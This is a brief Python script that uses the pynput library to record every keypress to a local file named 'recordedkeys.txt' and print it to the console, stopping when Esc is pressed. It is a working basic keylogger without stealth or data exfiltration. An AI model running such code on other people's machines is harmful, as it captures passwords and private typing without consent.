from pynput import keyboard
def keypresses(key):
    print(str(key))
    with open("recordedkeys.txt" , 'a') as logkey:
        logkey.write(str(key) + "\n")
def keyreleases(key):
    if key == keyboard.Key.esc:
        return False
with keyboard.Listener(on_press=keypresses, on_release=keyreleases) as listener:
    listener.join()

     